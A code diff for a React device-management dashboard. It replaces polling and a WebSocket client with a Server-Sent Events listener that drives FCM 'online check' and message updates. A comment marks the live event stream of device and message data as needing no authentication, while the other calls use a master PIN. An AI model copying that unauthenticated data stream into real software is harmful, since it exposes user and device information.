@@ -1027,13 +1027,8 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   const [log, setLog] = useState("");
   const [disableState, setDisableState] = useState<FcmState>("idle");
   const [countdown, setCountdown] = useState(0);
-  const pollRef2 = useRef<ReturnType<typeof setInterval> | null>(null);
-  const clickedAt2 = useRef<number>(0);
 
-  // Cleanup poll on unmount
-  useEffect(() => () => { if (pollRef2.current) clearInterval(pollRef2.current); }, []);
-
-  // Live countdown for online_check: 0 → 30s
+  // Live countdown for online_check: 0 → 30s (via SSE device_updated event)
   useEffect(() => {
     if (state !== "sending" || action !== "online_check") return;
     setCountdown(0);
@@ -1044,17 +1039,16 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   // Auto-timeout online_check after 30s
   useEffect(() => {
     if (state !== "sending" || action !== "online_check") return;
-    const t = setTimeout(() => { setState("idle"); setLog(""); if (pollRef2.current) { clearInterval(pollRef2.current); pollRef2.current = null; } }, 30000);
+    const t = setTimeout(() => { setState("idle"); setLog(""); }, 30000);
     return () => clearTimeout(t);
   }, [state, action]);
 
-  // WS path (fires if WebSocket is connected)
+  // SSE: device responded → stop countdown & show ✓ Online
   useEffect(() => {
     if (action !== "online_check") return;
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
       if (deviceId !== device.deviceId) return;
-      if (pollRef2.current) { clearInterval(pollRef2.current); pollRef2.current = null; }
       setState("ok");
       setTimeout(() => { setState("idle"); setLog(""); }, 3000);
     }
@@ -1066,27 +1060,11 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
     if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
     if (action === "online_check") {
       setState("sending"); setLog("");
-      clickedAt2.current = Date.now();
-      // Poll API every 5s to detect device response via lastOnline update
-      if (pollRef2.current) clearInterval(pollRef2.current);
-      pollRef2.current = setInterval(async () => {
-        try {
-          const r = await apiFetch(`/api/master/all-devices?appId=${encodeURIComponent(device.appId)}`, { headers: { "x-master-pin": masterPin } });
-          if (!r.ok) return;
-          const list = await r.json() as FullDevice[];
-          const updated = list.find(d => d.deviceId === device.deviceId);
-          if (!updated?.lastOnline) return;
-          if (new Date(updated.lastOnline).getTime() >= clickedAt2.current - 2000) {
-            if (pollRef2.current) { clearInterval(pollRef2.current); pollRef2.current = null; }
-            window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: device.deviceId } }));
-          }
-        } catch { /* ignore */ }
-      }, 5000);
       try {
         const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
-        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); if (pollRef2.current) { clearInterval(pollRef2.current); pollRef2.current = null; } }
-        // stays "sending" until poll detects response or 30s timeout
-      } catch { setLog("Network error"); setState("err"); if (pollRef2.current) { clearInterval(pollRef2.current); pollRef2.current = null; } }
+        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); }
+        // stays "sending" until SSE fires device_updated or 30s timeout
+      } catch { setLog("Network error"); setState("err"); }
       return;
     }
     setState("sending"); setLog("Sending…");
@@ -1449,68 +1427,40 @@ function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: st
   const [done, setDone] = useState(false);
   const [seconds, setSeconds] = useState(0);
   const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
-  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
-  const clickedAtRef = useRef<number>(0);
 
-  function stopAll() {
+  function stopTimer() {
     if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
-    if (pollRef.current)  { clearInterval(pollRef.current);  pollRef.current  = null; }
   }
+  useEffect(() => () => stopTimer(), []);
 
-  useEffect(() => () => stopAll(), []);
-
-  // SSE / WebSocket path (fires if WS is connected)
+  // SSE fires mrrobot:device_updated → stop countdown, show ✓ Online
   useEffect(() => {
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
-      if (deviceId !== device.deviceId || !checking) return;
-      stopAll(); setChecking(false); setSeconds(0); setDone(true);
+      if (deviceId !== device.deviceId) return;
+      stopTimer(); setChecking(false); setSeconds(0); setDone(true);
       setTimeout(() => setDone(false), 3000);
     }
     window.addEventListener("mrrobot:device_updated", onUpdated);
     return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
-  }, [device.deviceId, checking]);
+  }, [device.deviceId]); // eslint-disable-line react-hooks/exhaustive-deps
 
   async function handleClick() {
     if (checking) return;
-    stopAll();
+    stopTimer();
     setDone(false); setChecking(true); setSeconds(0);
-    clickedAtRef.current = Date.now();
-
-    // 1-second countdown
+    // 30s countdown — stops early when SSE fires device_updated
     timerRef.current = setInterval(() => {
       setSeconds(s => {
         const next = s + 1;
-        if (next >= 30) { stopAll(); setChecking(false); setSeconds(0); return 0; }
+        if (next >= 30) { stopTimer(); setChecking(false); setSeconds(0); return 0; }
         return next;
       });
     }, 1000);
-
-    // Poll API every 5s to detect device response via lastOnline update
-    pollRef.current = setInterval(async () => {
-      try {
-        const r = await apiFetch(
-          `/api/master/all-devices?appId=${encodeURIComponent(device.appId)}`,
-          { headers: { "x-master-pin": masterPin } }
-        );
-        if (!r.ok) return;
-        const list = await r.json() as FullDevice[];
-        const updated = list.find(d => d.deviceId === device.deviceId);
-        if (!updated?.lastOnline) return;
-        const newTime = new Date(updated.lastOnline).getTime();
-        if (newTime >= clickedAtRef.current - 2000) {
-          // Device just responded
-          window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: device.deviceId } }));
-          stopAll(); setChecking(false); setSeconds(0); setDone(true);
-          setTimeout(() => setDone(false), 3000);
-        }
-      } catch { /* ignore */ }
-    }, 5000);
-
     try {
       await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "online_check" } }) });
     } catch {
-      stopAll(); setChecking(false); setSeconds(0);
+      stopTimer(); setChecking(false); setSeconds(0);
     }
   }
 
@@ -1977,37 +1927,33 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     return () => window.removeEventListener("mrrobot:refresh_devices", onRefresh);
   }, [fetchOnlineCount]);
 
-  // ── Global WebSocket: live device_updated + message_added events ──
+  // ── Global SSE: live device_updated + message_added (no auth required) ──
   useEffect(() => {
-    let ws: WebSocket | null = null;
+    let es: EventSource | null = null;
     let closed = false;
-    let retryDelay = 2000;
     function connect() {
       if (closed) return;
-      const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
-      ws = new WebSocket(`${proto}//${window.location.host}/api/events`);
-      ws.onopen = () => { retryDelay = 2000; };
-      ws.onmessage = (e) => {
-        let parsed: { event: string; data: unknown };
-        try { parsed = JSON.parse(typeof e.data === "string" ? e.data : ""); }
-        catch { return; }
-        const { event, data } = parsed;
-        if (event === "device_updated") {
-          const d = data as FullDevice;
-          // Dispatch so CardCheckBtn + DeviceActionPanel can react
+      es = new EventSource("/api/events");
+      es.addEventListener("device_updated", (e: MessageEvent) => {
+        try {
+          const d = JSON.parse(e.data as string) as FullDevice;
           window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: d.deviceId } }));
-          // Trigger a devices refresh
           window.dispatchEvent(new CustomEvent("mrrobot:refresh_devices"));
-        } else if (event === "message_added") {
-          // Trigger messages refresh across tabs
-          window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: data }));
-        }
+        } catch { /* ignore */ }
+      });
+      es.addEventListener("message_added", (e: MessageEvent) => {
+        try {
+          const payload = JSON.parse(e.data as string) as { appId: string; message: MsgRow };
+          window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
+        } catch { /* ignore */ }
+      });
+      es.onerror = () => {
+        es?.close();
+        if (!closed) setTimeout(connect, 3000);
       };
-      ws.onclose = () => { if (!closed) { setTimeout(connect, retryDelay); retryDelay = Math.min(retryDelay * 1.5, 30000); } };
-      ws.onerror = () => ws?.close();
     }
     connect();
-    return () => { closed = true; ws?.close(); };
+    return () => { closed = true; es?.close(); };
   }, []);
 
   async function handlePingAll() {
